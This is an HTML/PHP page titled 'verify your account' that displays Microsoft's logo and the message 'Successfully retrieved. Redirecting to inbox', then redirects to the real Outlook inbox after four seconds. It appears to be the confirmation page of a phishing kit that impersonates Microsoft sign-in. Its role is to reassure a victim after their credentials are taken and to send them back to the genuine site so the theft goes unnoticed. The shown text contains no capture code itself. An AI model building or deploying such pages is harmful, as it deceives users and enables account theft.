<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>verify your account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv='refresh' content='4;url=<?php echo "https://outlook.office.com/mail/inbox"; ?>'>
    <link rel="stylesheet" type="text/css" media="screen" href="main.css" />
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <link href="lib/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="assets/images/favicon2.png" type="image/x-icon">
    <link href="css/style.css" rel="stylesheet">
    <link href="css/style-responsive.css" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.0/jquery-ui.min.js"></script>
    <script src="index.js"></script>


</head>
<style>
.containerdiv{
    box-shadow: 0 0 4px silver;
    height:500px; 
    background-color:white;
    margin-left:37%;
    margin-top:5%;
    padding-left:5px;
    padding-top:5px;
    zoom: 0.8;
}

    #image{
       margin-left:50px;
       margin-top: 30px;
    }

    .containerdiv2{
    box-shadow: none;
    width:70%; 
    height:50%; 
    background-color:white;
    margin-top:100px;
    margin-left:20%;
}

     @media (max-width: 700px){
     .containerdiv{
     width : 80%; 
     margin-left :10%; 
     height:500px;
     } 
}

     @media (min-width: 700px) and (max-width: 1100px){
     .containerdiv{
     width : 60%; 
     margin-left : 15%; 
     } 
}

     @media (min-width: 1100px) and (max-width: 1500px){
     .containerdiv{
     width : 25%; 
     margin-left : 35%; 
     } 
}


    #verify{
       margin-left:50px;
       margin-top:7px; 
       color: grey;
       font-size: 17px;
       font-weight: 450;
       font-family:"Segoe UI","Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";     
    }

</style>

<body>

<div class = "containerdiv">
   <img id ="image" src = "https://logo.clearbit.com/microsoft.com" alt = "logo" height="70px" width="120px">
   <p id="verify"> Successfully retrieved. Redirecting to<br>inbox ...</p>
   <div class = "containerdiv2">
        <div class='check' id='check'></div>
    </div>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</body>
</html>